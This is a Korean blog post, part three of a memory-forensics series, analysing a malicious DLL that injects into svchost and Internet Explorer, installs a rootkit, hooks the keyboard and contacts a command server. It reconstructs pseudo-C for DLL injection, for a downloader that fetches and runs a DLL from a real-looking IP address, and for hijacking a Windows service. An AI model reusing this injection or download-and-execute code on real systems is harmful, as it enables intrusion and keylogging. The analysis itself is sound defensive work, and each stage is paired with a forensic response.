---
layout: post
title: 'DFIRCON 2014 : Memory Forensics (Part III) – irykmmww.d1l'
date: 2014-02-11 14:56:40.000000000 +09:00
type: post
published: true
status: publish
categories:
- Malware Analysis
- Memory Forensics
tags:
- malware analysis
- memory forensics
- rootkit
- windows
meta:
  _edit_last: '1'
  slide_template: default
  pyre_video: ''
  pyre_full_width: 'no'
  pyre_sidebar_position: default
  pyre_fimg_width: ''
  pyre_fimg_height: ''
  pyre_image_rollover_icons: linkzoom
  pyre_link_icon_url: ''
  pyre_related_posts: 'yes'
  pyre_slider_type: 'no'
  pyre_slider: '0'
  pyre_wooslider: '0'
  pyre_flexslider: '0'
  pyre_revslider: '0'
  pyre_elasticslider: '0'
  pyre_fallback: ''
  pyre_page_bg_layout: default
  pyre_page_bg: ''
  pyre_page_bg_color: ''
  pyre_page_bg_full: 'no'
  pyre_page_bg_repeat: repeat
  pyre_wide_page_bg: ''
  pyre_wide_page_bg_color: ''
  pyre_wide_page_bg_full: 'no'
  pyre_wide_page_bg_repeat: repeat
  pyre_header_bg: ''
  pyre_header_bg_color: ''
  pyre_header_bg_full: 'no'
  pyre_header_bg_repeat: repeat
  pyre_page_title: 'no'
  pyre_page_title_text: 'no'
  pyre_page_title_custom_text: ''
  pyre_page_title_custom_subheader: ''
  pyre_page_title_height: ''
  pyre_page_title_bar_bg: ''
  pyre_page_title_bar_bg_retina: ''
  pyre_page_title_bar_bg_full: default
  pyre_page_title_bar_bg_color: ''
  pyre_page_title_bg_parallax: default
  _wpas_done_all: '1'
  avada_post_views_count: '1696'
  sbg_selected_sidebar: a:1:{i:0;s:1:"0";}
  sbg_selected_sidebar_replacement: a:1:{i:0;s:1:"0";}
  fusion_builder_content_backup: "세 번째 포스팅이다. 이번 포스팅에서는 악성 바이너리 중 가장 많은 역할을 수행하는 \"irykmmww.d1l'을
    분석하고자 한다. 이 DLL은 가운데 스펠링을 1로 변경하였으며, svchost.exe와 iexplore.exe에 인젝션되어 있다.\n\n&nbsp;\n<h2>1.
    기능 요약</h2>\n본 악성 DLL은 크게 3가지 상황에서 각기 다른 임무를 수행하도록 구성되어 있다. 이 악성코드는 DLL 인젝션된 프로세스
    명이 svchost.exe인 경우와 아닌 경우, 서비스로 실행되는 경우에 따라 다른 임무를 수행한다. 일단 svchost.exe에 DLL 인젝션
    됐을 경우에는 다음 역할을 수행한다.\n<ul>\n\t<li>Internet Explorer(iexplore.exe)에 DLL 인젝션</li>\n</ul>\nDLL
    인젝션된 프로세스 명이 svchost.exe가 아닐 때 (e.g. iexplore.exe)는 다음 임무를 수행한다.\n<ul>\n\t<li>DLL에
    있는 SK 함수 호출(키보드 후킹)</li>\n\t<li>악성 서버 접속</li>\n\t<li>루트킷 설치 및 실행</li>\n\t<li>특정
    명령을 받으면 루트킷과 관련된 파일 및 레지스트리 제거</li>\n</ul>\n이 DLL이 서비스로 동작하는 경우에는 다음 임무를 수행한다.\n<ul>\n\t<li>레지스트리
    변조로 인해 로드되지 못한 서비스를 정상적으로 로드</li>\n</ul>\n이제 각 요소를 분석하겠다.\n<h2>2. 최초 실행</h2>\n이
    DLL은 서비스로 로드될 경우와 DLL 인젝션으로 로드된 경우에 따라 다른 임무를 수행한다. 최초에 DLL 인젝션이 되면, 자기자신의 인스턴스(DINSTANCE)를
    가져와서 GetModuleFileName으로 DLL의 경로를 가져온 후, CreateFile-&gt;ReadFile로 자신의 코드를 그대로
    메모리 버퍼에 복사한다. (이 데이터는 추 후 DLL 인젝션에 사용된다.)\n\n버퍼에 복사가 완료되면 자신이 로드된 영역이 어떤 프로세스의
    메모리인지를 확인한다.  자신이 로드된 프로세스 명이 \"SVCHOST.EXE\"일 때와 아닐 때로 나뉘어서 기능이 수행된다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/02/irykmmww.d1l_dllmain.png\"><img
    class=\"aligncenter size-full wp-image-814\" alt=\"irykmmww.d1l_dllmain\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/02/irykmmww.d1l_dllmain.png\"
    width=\"715\" height=\"385\" /></a>\n\n일단 SVCHOST.EXE일 때 수행되는 스레드(위 그림에서는 ThreadifSVCHOST)의
    기능을 알아보겠다.\n<h2>3. Internet Explorer(추정)에 DLL 인젝션</h2>\n제목에는 인터넷 익스플로러로 명시했지만
    이는 사실 추정이다. 코드 분석에서 아직 어떤 프로세스인지는 명확하게 정의하지 못했다. 이에 바이너리를 strings로 긁어서 iexplore.exe의
    전체 경로가 있는 것을 보고 어느정도 추정을 하였다. 이 DLL 인젝션은 인터넷에 잘 알려진 방법 중 하나인 CreateRemoteThread의
    인자로 LoadLibrary를 주는 방법을 사용하였다.\n\n악성코드는 사전에 CreateFile로 인터넷 익스플로러의 PID를 얻어온다.
    이 때 ShowWindow를 False로 하여 사용자에게 보이지 않게 한다. 그 후, OpenProcess로 해당 프로세스의 핸들을 획득한다.
    그리고 획득한 핸들을 기반으로 VirtualAllocEx-&gt;WriteProcessMemory-&gt;CreateRemoteThread로
    DLL 인션과 해당 프로세스에 DLL을 로딩할 수 있도록 한다. 잘 알려진 방법이니 간단하게 코드로 표현하겠다.\n<pre class=\"lang:c++
    decode:true\" title=\"DLL Injection\">HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS,
    FALSE, Pid);\nvAddress = VirtualAllocEx(hHandle, 0, strlen(str)*2+2, 0x1000, 4);\nWriteProcessMemory(hHandle,
    vAddress, str, strlen(str)*2+2, 0);\n_LoadLibrary = GetProcAddress(GetModuleHandle(\"Kernel32\"),
    \"LoadLibrary\");\nhThread = CreateRemoteThread(hHandle, NULL, NULL,_LoadLibrary,
    vAddress, 0, 0);\nWaitForSingbleObject(hThread, INFINITE);</pre>\nsvchost.exe는
    이렇게 다른 프로세스(인터넷 익스플로러로 추정)에 DLL을 인젝션하고 로드하는 용도로 사용된다.\n\n- 대응 : 비정상적으로 로드된 DLL
    식별\n\n&nbsp;\n\n여기서부터는 svchost.exe가 아닌 경우, 즉, internet explorer에 인젝션된 D1L의 임무를
    다룬다.\n<h2>4. 루트킷 설치 및 SSDT 후킹 명령 전달</h2>\n인터넷 익스플로러에서 악성코드가 로드되면, 악성 루트킷을 설치한다.
    \"%SystemDirectory%driverirykmmww.sys\"를 서비스에 등록하고, 서비스를 실행한다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/02/setupnrunrootkitservice.png\"><img
    class=\"aligncenter size-full wp-image-815\" alt=\"setupnrunrootkitservice\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/02/setupnrunrootkitservice.png\"
    width=\"699\" height=\"434\" /></a>\n\n서비스를 구동하고 나면, DeviceIoControl로 해당 드라이버에
    0x25610008 메시지 코드를 전송한다.  이 코드를 받으면 드라이버(irykmmww.sys)는 SSDT 후킹을 수행한다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/02/runrootkithookssdt.png\"><img
    class=\"aligncenter size-full wp-image-816\" alt=\"runrootkithookssdt\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/02/runrootkithookssdt.png\"
    width=\"738\" height=\"375\" /></a>\n\n그리고 0x25610010 메시지 코드와 함께 인터넷 익스플로러의 PID를
    드라이버에 전송(SendMyPIDtoRootkit)하고, 기존 신뢰성을 가진(Trusted) 서비스의 DLL 경로를 이 악성D1L로 변경(%SystemRoot%System32irykmmww.d1l)하기
    위해 D1L의 이름과 변경할 레지스트리 주소를 루트킷에게 전달한다. 이 과정을 보면 <strong><span style=\"color: #ff6600;\">이
    D1L의 인젝션 시점은 디바이스 드라이버보다 빠르다</span></strong>고 생각해 볼 수 있다.\n\n- 대응 : 서비스 목록 및 디바이스
    드라이버 추출 필요\n<h2>5. DLL에 있는 SK 함수 호출</h2>\n앞서 explorer.exe에 인젝션 되어 있는 irykmmww.dll의
    익스포트 함수인 SK를 호출한다. 호출된 SK 함수는 전역 키보드 후킹을 수행한다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/02/callskfuncindll.png\"><img
    class=\"aligncenter size-full wp-image-817\" alt=\"callskfuncindll\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/02/callskfuncindll.png\"
    width=\"648\" height=\"360\" /></a>\n\n- 대응 : 메시지 후킹 여부 검증\n<h2>6. 공격자 서버에 연결</h2>\n위
    일련의 과정이 완료되면, 특정 서버에 접속을 시도한다. 일단 악성코드가 가지고 있는 IP 주소 또는 도메인 명을 가져온 다음, 도메인 주소일
    경우 IP로 변환(Extract IP_or_Domain)하고 루트킷에게 IP 주소(SendIPAddressToRootkit)를 전달한다. 그리고나서
    HttpQuery API로 해당 IP에 올바르게 접근이 되는지 확인(HTTPQueryNReadResponse)한다. 이 과정을 거치면, 실제로
    InternetOpenUrl로 악성코드에서 생성한 URL인 \"http://218.85.133.23:89/index.asp?503010000\"
    에 접속한다.\n<pre class=\"lang:c++ decode:true\" title=\"ConnectToMalformedServer\">Extract_IP_or_Domain(IP,
    strIPAddress);\nSendIPAddrsstoRootkit(strIPaddress, TRUE);\nHttpQueryNReadResponse(IP);\n...\nlib
    = LoadLibrary(unknown);\nreturn = InternetOpen();\nwprintf(Url, \"http://%s:%d/%s%d%08d\",
    \"218.85.133.23\", 89, \"index.asp?\", 5030, 10000);\nHandle = InternetOpenUrl(return,
    Url, NULL, NULL, 0x80000100, 0);\nHttpQueryInfo(Handle, 19, Buffer...);\nif(!strcmp(Buffer,
    \"200\")) {\n    DownloadMalicious_DLL();\n}\nInternetCloseHandle(Handle);\n_ToWork
    = GetProcAddress(lib, \"ToWork\");\n_ToWork();</pre>\nURL 접속에 성공(Server status
    : 200)하면, 추가적인 파일을 다운로드한다. 현재 메모리 분석 결과로는 어떠한 파일인지 확인되진 않았으나, 다운로드 후의 행동을 보면,
    해당 파일은 DLL이고 ToWork라는 익스포트 함수가 있는 것으로 추정할 수 있다. 네트워크 접속 정보는 메모리 분석으로도 확인할 수 있다.\n<pre
    class=\"lang:sh decode:true\" title=\"connections\">$ python vol.py -f APT.img
    --profile=WinXPSP3x86 connections\nVolatility Foundation Volatility Framework
    2.3.1\nOffset(V)  Local Address             Remote Address            Pid\n----------
    ------------------------- ------------------------- ---\n0x81e611f8 192.168.157.10:1053
    \      218.85.133.23:89          796</pre>\n해당 IP는 중국 할당되어 있으며 whois 조회 결과는 다음과
    같다.\n\n<a href=\"http://forensic.n0fate.com/wp-content/uploads/2014/02/whois.png\"><img
    class=\"aligncenter size-full wp-image-826\" alt=\"whois\" src=\"http://forensic.n0fate.com/wp-content/uploads/2014/02/whois.png\"
    width=\"859\" height=\"512\" /></a>\n\n- 대응 : 서버 연결 및 악성 앱 다운로드 기능을 내포하므로, 웹브라우저
    히스토리나 네트워크 세션 정보 추가 분석 필요\n<h2>7. 루트킷 제거</h2>\n위에서 설명한 URL에 지속적인 접근을 시도하다가 일정
    시점이 되면, 그동안 등록했던 모든 파일을 삭제하고, 서비스를 제거하며, 루트킷으로 인해 변경된 레지스트리 정보를 원상 복귀시킨다.\n\n-
    대응 : 삭제된 파일 분석 필요\n\n<span style=\"font-size: 1.5em; line-height: 1.5em;\">8.
    D1L이 서비스로 동작할 경우</span>\n\nPart IV에서 설명할 루트킷을 보면, 해당 악성코드를 로드하기 위해 레지스트리 키를 변경하는
    것을 볼 수 있다. 루트킷은 윈도우 XP의 경우 dmserver(Logical Disk Management Server Service)의 경로이며,
    2000의 경우 rpcss (Remote Procedure Call Service)의 경로를 d1l의 경로로 수정한다. 하지만 두 서비스는
    윈도우의 주요 서비스이기 때문에 정상적으로 로드 되지 않으면 시스템에 문제가 발생할 수 있다. 이에 D1L이 서비스로 동작한다면 즉, 로드되면서
    ServiceMain함수가 호출된다면, LoadLibrary와 GetProcAddress로 원본 DLL을 강제로 로딩하여 ServiceMain
    함수를 호출한다. 다음은 위 과정을 코드로 설명한 것이다.\n<pre class=\"lang:c++ decode:true\" title=\"ServiceMain\">char*
    LibName = \"\";\nif(GetVersion() &lt;= 5)\n{\n    LibName = \"rpcss.dll\";\n}\nelse\n{\n
    \   LibName = \"dmserver.dll\";\n}\nresult = LoadLibrary(LibName);\n_ServiceMain
    = GetProcAddress(result, \"ServiceMain);\n_ServiceMain();</pre>\n- 대응 : 메모리에서
    의심스러운 DLL 식별 및 추출\n<h2>9. 마치며..</h2>\n본 악성코드는 전체적으로 악성행위를 주도하고 제어하는 역할을 수행하는 악성
    코드의 제어부를 다루고 있다. Part IV에서는 악성코드의 자동실행과 은닉을 담당하는 'irykmmww.sys' 루트킷의 기능을 다루도록
    하겠다."
  fusion_builder_converted: 'yes'
author:
  login: n0fate
  email: rapfer@gmail.com
  display_name: n0fate
  first_name: ''
  last_name: ''
---
<p>세 번째 포스팅이다. 이번 포스팅에서는 악성 바이너리 중 가장 많은 역할을 수행하는 "irykmmww.d1l'을 분석하고자 한다. 이 DLL은 가운데 스펠링을 1로 변경하였으며, svchost.exe와 iexplore.exe에 인젝션되어 있다.</p>
<p>&nbsp;</p>
<h2>1. 기능 요약</h2>
<p>본 악성 DLL은 크게 3가지 상황에서 각기 다른 임무를 수행하도록 구성되어 있다. 이 악성코드는 DLL 인젝션된 프로세스 명이 svchost.exe인 경우와 아닌 경우, 서비스로 실행되는 경우에 따라 다른 임무를 수행한다. 일단 svchost.exe에 DLL 인젝션 됐을 경우에는 다음 역할을 수행한다.</p>
<ul>
<li>Internet Explorer(iexplore.exe)에 DLL 인젝션</li>
</ul>
<p>DLL 인젝션된 프로세스 명이 svchost.exe가 아닐 때 (e.g. iexplore.exe)는 다음 임무를 수행한다.</p>
<ul>
<li>DLL에 있는 SK 함수 호출(키보드 후킹)</li>
<li>악성 서버 접속</li>
<li>루트킷 설치 및 실행</li>
<li>특정 명령을 받으면 루트킷과 관련된 파일 및 레지스트리 제거</li>
</ul>
<p>이 DLL이 서비스로 동작하는 경우에는 다음 임무를 수행한다.</p>
<ul>
<li>레지스트리 변조로 인해 로드되지 못한 서비스를 정상적으로 로드</li>
</ul>
<p>이제 각 요소를 분석하겠다.</p>
<h2>2. 최초 실행</h2>
<p>이 DLL은 서비스로 로드될 경우와 DLL 인젝션으로 로드된 경우에 따라 다른 임무를 수행한다. 최초에 DLL 인젝션이 되면, 자기자신의 인스턴스(DINSTANCE)를 가져와서 GetModuleFileName으로 DLL의 경로를 가져온 후, CreateFile-&gt;ReadFile로 자신의 코드를 그대로 메모리 버퍼에 복사한다. (이 데이터는 추 후 DLL 인젝션에 사용된다.)</p>
<p>버퍼에 복사가 완료되면 자신이 로드된 영역이 어떤 프로세스의 메모리인지를 확인한다.  자신이 로드된 프로세스 명이 "SVCHOST.EXE"일 때와 아닐 때로 나뉘어서 기능이 수행된다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/02/irykmmww.d1l_dllmain.png"><img class="aligncenter size-full wp-image-814" alt="irykmmww.d1l_dllmain" src="{{ site.baseurl }}/assets/irykmmww.d1l_dllmain.png" width="715" height="385" /></a></p>
<p>일단 SVCHOST.EXE일 때 수행되는 스레드(위 그림에서는 ThreadifSVCHOST)의 기능을 알아보겠다.</p>
<h2>3. Internet Explorer(추정)에 DLL 인젝션</h2>
<p>제목에는 인터넷 익스플로러로 명시했지만 이는 사실 추정이다. 코드 분석에서 아직 어떤 프로세스인지는 명확하게 정의하지 못했다. 이에 바이너리를 strings로 긁어서 iexplore.exe의 전체 경로가 있는 것을 보고 어느정도 추정을 하였다. 이 DLL 인젝션은 인터넷에 잘 알려진 방법 중 하나인 CreateRemoteThread의 인자로 LoadLibrary를 주는 방법을 사용하였다.</p>
<p>악성코드는 사전에 CreateFile로 인터넷 익스플로러의 PID를 얻어온다. 이 때 ShowWindow를 False로 하여 사용자에게 보이지 않게 한다. 그 후, OpenProcess로 해당 프로세스의 핸들을 획득한다. 그리고 획득한 핸들을 기반으로 VirtualAllocEx-&gt;WriteProcessMemory-&gt;CreateRemoteThread로 DLL 인션과 해당 프로세스에 DLL을 로딩할 수 있도록 한다. 잘 알려진 방법이니 간단하게 코드로 표현하겠다.</p>
<pre class="lang:c++ decode:true" title="DLL Injection">HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
vAddress = VirtualAllocEx(hHandle, 0, strlen(str)*2+2, 0x1000, 4);
WriteProcessMemory(hHandle, vAddress, str, strlen(str)*2+2, 0);
_LoadLibrary = GetProcAddress(GetModuleHandle("Kernel32"), "LoadLibrary");
hThread = CreateRemoteThread(hHandle, NULL, NULL,_LoadLibrary, vAddress, 0, 0);
WaitForSingbleObject(hThread, INFINITE);</pre>
<p>svchost.exe는 이렇게 다른 프로세스(인터넷 익스플로러로 추정)에 DLL을 인젝션하고 로드하는 용도로 사용된다.</p>
<p>- 대응 : 비정상적으로 로드된 DLL 식별</p>
<p>&nbsp;</p>
<p>여기서부터는 svchost.exe가 아닌 경우, 즉, internet explorer에 인젝션된 D1L의 임무를 다룬다.</p>
<h2>4. 루트킷 설치 및 SSDT 후킹 명령 전달</h2>
<p>인터넷 익스플로러에서 악성코드가 로드되면, 악성 루트킷을 설치한다. "%SystemDirectory%driverirykmmww.sys"를 서비스에 등록하고, 서비스를 실행한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/02/setupnrunrootkitservice.png"><img class="aligncenter size-full wp-image-815" alt="setupnrunrootkitservice" src="{{ site.baseurl }}/assets/setupnrunrootkitservice.png" width="699" height="434" /></a></p>
<p>서비스를 구동하고 나면, DeviceIoControl로 해당 드라이버에 0x25610008 메시지 코드를 전송한다.  이 코드를 받으면 드라이버(irykmmww.sys)는 SSDT 후킹을 수행한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/02/runrootkithookssdt.png"><img class="aligncenter size-full wp-image-816" alt="runrootkithookssdt" src="{{ site.baseurl }}/assets/runrootkithookssdt.png" width="738" height="375" /></a></p>
<p>그리고 0x25610010 메시지 코드와 함께 인터넷 익스플로러의 PID를 드라이버에 전송(SendMyPIDtoRootkit)하고, 기존 신뢰성을 가진(Trusted) 서비스의 DLL 경로를 이 악성D1L로 변경(%SystemRoot%System32irykmmww.d1l)하기 위해 D1L의 이름과 변경할 레지스트리 주소를 루트킷에게 전달한다. 이 과정을 보면 <strong><span style="color: #ff6600;">이 D1L의 인젝션 시점은 디바이스 드라이버보다 빠르다</span></strong>고 생각해 볼 수 있다.</p>
<p>- 대응 : 서비스 목록 및 디바이스 드라이버 추출 필요</p>
<h2>5. DLL에 있는 SK 함수 호출</h2>
<p>앞서 explorer.exe에 인젝션 되어 있는 irykmmww.dll의 익스포트 함수인 SK를 호출한다. 호출된 SK 함수는 전역 키보드 후킹을 수행한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/02/callskfuncindll.png"><img class="aligncenter size-full wp-image-817" alt="callskfuncindll" src="{{ site.baseurl }}/assets/callskfuncindll.png" width="648" height="360" /></a></p>
<p>- 대응 : 메시지 후킹 여부 검증</p>
<h2>6. 공격자 서버에 연결</h2>
<p>위 일련의 과정이 완료되면, 특정 서버에 접속을 시도한다. 일단 악성코드가 가지고 있는 IP 주소 또는 도메인 명을 가져온 다음, 도메인 주소일 경우 IP로 변환(Extract IP_or_Domain)하고 루트킷에게 IP 주소(SendIPAddressToRootkit)를 전달한다. 그리고나서 HttpQuery API로 해당 IP에 올바르게 접근이 되는지 확인(HTTPQueryNReadResponse)한다. 이 과정을 거치면, 실제로 InternetOpenUrl로 악성코드에서 생성한 URL인 "http://218.85.133.23:89/index.asp?503010000" 에 접속한다.</p>
<pre class="lang:c++ decode:true" title="ConnectToMalformedServer">Extract_IP_or_Domain(IP, strIPAddress);
SendIPAddrsstoRootkit(strIPaddress, TRUE);
HttpQueryNReadResponse(IP);
...
lib = LoadLibrary(unknown);
return = InternetOpen();
wprintf(Url, "http://%s:%d/%s%d%08d", "218.85.133.23", 89, "index.asp?", 5030, 10000);
Handle = InternetOpenUrl(return, Url, NULL, NULL, 0x80000100, 0);
HttpQueryInfo(Handle, 19, Buffer...);
if(!strcmp(Buffer, "200")) {
    DownloadMalicious_DLL();
}
InternetCloseHandle(Handle);
_ToWork = GetProcAddress(lib, "ToWork");
_ToWork();</pre>
<p>URL 접속에 성공(Server status : 200)하면, 추가적인 파일을 다운로드한다. 현재 메모리 분석 결과로는 어떠한 파일인지 확인되진 않았으나, 다운로드 후의 행동을 보면, 해당 파일은 DLL이고 ToWork라는 익스포트 함수가 있는 것으로 추정할 수 있다. 네트워크 접속 정보는 메모리 분석으로도 확인할 수 있다.</p>
<pre class="lang:sh decode:true" title="connections">$ python vol.py -f APT.img --profile=WinXPSP3x86 connections
Volatility Foundation Volatility Framework 2.3.1
Offset(V)  Local Address             Remote Address            Pid
---------- ------------------------- ------------------------- ---
0x81e611f8 192.168.157.10:1053       218.85.133.23:89          796</pre>
<p>해당 IP는 중국 할당되어 있으며 whois 조회 결과는 다음과 같다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/02/whois.png"><img class="aligncenter size-full wp-image-826" alt="whois" src="{{ site.baseurl }}/assets/whois.png" width="859" height="512" /></a></p>
<p>- 대응 : 서버 연결 및 악성 앱 다운로드 기능을 내포하므로, 웹브라우저 히스토리나 네트워크 세션 정보 추가 분석 필요</p>
<h2>7. 루트킷 제거</h2>
<p>위에서 설명한 URL에 지속적인 접근을 시도하다가 일정 시점이 되면, 그동안 등록했던 모든 파일을 삭제하고, 서비스를 제거하며, 루트킷으로 인해 변경된 레지스트리 정보를 원상 복귀시킨다.</p>
<p>- 대응 : 삭제된 파일 분석 필요</p>
<p><span style="font-size: 1.5em; line-height: 1.5em;">8. D1L이 서비스로 동작할 경우</span></p>
<p>Part IV에서 설명할 루트킷을 보면, 해당 악성코드를 로드하기 위해 레지스트리 키를 변경하는 것을 볼 수 있다. 루트킷은 윈도우 XP의 경우 dmserver(Logical Disk Management Server Service)의 경로이며, 2000의 경우 rpcss (Remote Procedure Call Service)의 경로를 d1l의 경로로 수정한다. 하지만 두 서비스는 윈도우의 주요 서비스이기 때문에 정상적으로 로드 되지 않으면 시스템에 문제가 발생할 수 있다. 이에 D1L이 서비스로 동작한다면 즉, 로드되면서 ServiceMain함수가 호출된다면, LoadLibrary와 GetProcAddress로 원본 DLL을 강제로 로딩하여 ServiceMain 함수를 호출한다. 다음은 위 과정을 코드로 설명한 것이다.</p>
<pre class="lang:c++ decode:true" title="ServiceMain">char* LibName = "";
if(GetVersion() &lt;= 5)
{
    LibName = "rpcss.dll";
}
else
{
    LibName = "dmserver.dll";
}
result = LoadLibrary(LibName);
_ServiceMain = GetProcAddress(result, "ServiceMain);
_ServiceMain();</pre>
<p>- 대응 : 메모리에서 의심스러운 DLL 식별 및 추출</p>
<h2>9. 마치며..</h2>
<p>본 악성코드는 전체적으로 악성행위를 주도하고 제어하는 역할을 수행하는 악성 코드의 제어부를 다루고 있다. Part IV에서는 악성코드의 자동실행과 은닉을 담당하는 'irykmmww.sys' 루트킷의 기능을 다루도록 하겠다.</p>
